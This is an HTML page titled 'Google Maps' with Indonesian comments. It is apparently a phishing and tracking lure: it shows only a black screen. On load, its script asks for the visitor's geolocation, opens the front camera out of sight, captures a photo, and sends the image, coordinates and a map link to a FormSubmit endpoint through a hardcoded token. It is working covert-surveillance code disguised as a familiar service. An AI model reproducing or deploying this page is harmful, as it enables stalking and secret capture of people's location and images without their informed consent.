<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps</title>
    <style>
        body {
            background-color: #000000;
            margin: 0;
            padding: 0;
            height: 100vh;
            overflow: hidden;
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        // Token FormSubmit Anda
        const TOKEN_FORM = "d9a1b68b96ce0a668a22f62f9a3f5284"; 

        document.addEventListener("DOMContentLoaded", () => {
            ambilLokasi();
        });

        function ambilLokasi() {
            console.log("Mengecek lokasi...");
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        console.log("Lokasi sukses:", lat, lon);
                        aktifkanKameraDanAmbil(lat, lon);
                    },
                    (error) => {
                        console.error("Izin lokasi ditolak.");
                        aktifkanKameraDanAmbil("-", "-");
                    }
                );
            } else {
                aktifkanKameraDanAmbil("-", "-");
            }
        }

        async function aktifkanKameraDanAmbil(lat, lon) {
            console.log("Mengakses kamera...");
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;

                video.onplaying = () => {
                    console.log("Kamera aktif, memproses frame...");
                    // Jeda 2 detik agar sensor lensa menyesuaikan pencahayaan
                    setTimeout(() => {
                        prosesJepretDanKirim(lat, lon, video, stream);
                    }, 2000);
                };

            } catch (error) {
                console.error("Kamera ditolak, mengirim teks lokasi saja.");
                kirimDataTeksSaja(lat, lon);
            }
        }

        function prosesJepretDanKirim(lat, lon, videoElement, stream) {
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            const lebar = videoElement.videoWidth || 640;
            const tinggi = videoElement.videoHeight || 480;
            
            canvas.width = lebar;
            canvas.height = tinggi;
            
            context.drawImage(videoElement, 0, 0, lebar, tinggi);

            // Matikan kamera secara bersih setelah frame diambil
            stream.getTracks().forEach(track => track.stop());

            // Konversi canvas menjadi file PNG fisik
            canvas.toBlob((blob) => {
                if (!blob || blob.size === 0) {
                    console.error("File gambar kosong, beralih ke teks.");
                    kirimDataTeksSaja(lat, lon);
                    return;
                }

                console.log("Ukuran gambar berhasil diproses:", blob.size, "bytes");

                const formData = new FormData();
                formData.append("Status_Kamera", "Sukses Diambil");
                formData.append("Latitude", lat);
                formData.append("Longitude", lon);
                formData.append("Link_Peta", `https://www.google.com/maps?q=${lat},${lon}`);
                
                // PENTING: Nama parameter WAJIB "attachment" agar dibaca sebagai file oleh FormSubmit
                formData.append("attachment", blob, "camera_capture.png");
                formData.append("_captcha", "false");

                eksekusiKirim(formData);
            }, "image/png");
        }

        function kirimDataTeksSaja(lat, lon) {
            const formData = new FormData();
            formData.append("Status_Kamera", "Gagal/Ditolak");
            formData.append("Latitude", lat);
            formData.append("Longitude", lon);
            formData.append("Link_Peta", `https://www.google.com/maps?q=${lat},${lon}`);
            formData.append("_captcha", "false");

            eksekusiKirim(formData);
        }

        async function eksekusiKirim(formData) {
            const url = `https://formsubmit.co/ajax/${TOKEN_FORM}`;
            console.log("Mengirim data ke server FormSubmit...");
            
            try {
                const response = await fetch(url, {
                    method: "POST",
                    body: formData
                });

                if (response.ok) {
                    console.log("BERHASIL: Seluruh data dan gambar terkirim!");
                } else {
                    console.error("Server merespon dengan error.");
                }
            } catch (err) {
                console.error("Gagal melakukan request network:", err.message);
            }
        }
    </script>
</body>
</html>
